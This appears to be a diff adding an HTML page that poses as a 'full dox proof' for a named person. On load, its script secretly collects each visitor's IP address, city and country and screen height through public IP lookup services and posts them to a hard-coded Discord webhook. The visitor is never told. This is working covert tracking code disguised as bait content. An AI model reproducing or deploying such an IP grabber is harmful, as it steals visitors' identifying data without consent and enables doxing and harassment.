@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="GUACOMOLEMAN DOX">
+    <meta property="og:description" content="GUACOMOLEMAN DOX">
+    <title>GUACOMOLEMAN FULL DOX PROOF</title>
+    <style>
+        body {
+            background-image: url('img.png'); /* Ensure img.png exists or update the path */
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Send visitor data as soon as the page loads
+        window.onload = function() {
+            getVisitorInfoAndSendData();
+        };
+
+        // Function to get visitor info (IP, location, screen height) and send to webhook
+        function getVisitorInfoAndSendData() {
+            // Get the screen height
+            const screenHeight = window.screen.height;
+
+            // Get visitor IP using ipify API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Now get the location information using ipinfo.io (this does not require a token)
+                    fetch('https://ipapi.co/' + ipData.ip + '/json/')
+                        .then(response => response.json())
+                        .then(data => {
+                            // Prepare the payload with IP, location, and screen height
+                            const ip = ipData.ip;
+                            const location = data.city ? `${data.city}, ${data.country_name}` : data.country_name;
+                            const payload = {
+                                content: `IP: ${ip}\nLocation: ${location}\nScreen Height: ${screenHeight}px`
+                            };
+
+                            // Webhook URL
+                            const webhookURL = 'https://canary.discord.com/api/webhooks/1387313392439656500/j3dgSAUkJoYUNFsFRgTPSxyJZ816RY9IRopRIWIr25aqP73QhNDqSdcR9BPI5hUYgINN';
+
+                            // Send the data to the webhook
+                            fetch(webhookURL, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(payload),
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Data sent successfully');
+                                } else {
+                                    console.error('Error sending data:', response.statusText);
+                                }
+                            })
+                            .catch((error) => {
+                                console.error('Error:', error);
+                            });
+                        })
+                        .catch((error) => {
+                            console.error('Error getting location info:', error);
+                        });
+                })
+                .catch((error) => {
+                    console.error('Error getting IP address:', error);
+                });
+        }
+    </script>
+</body>
+</html>
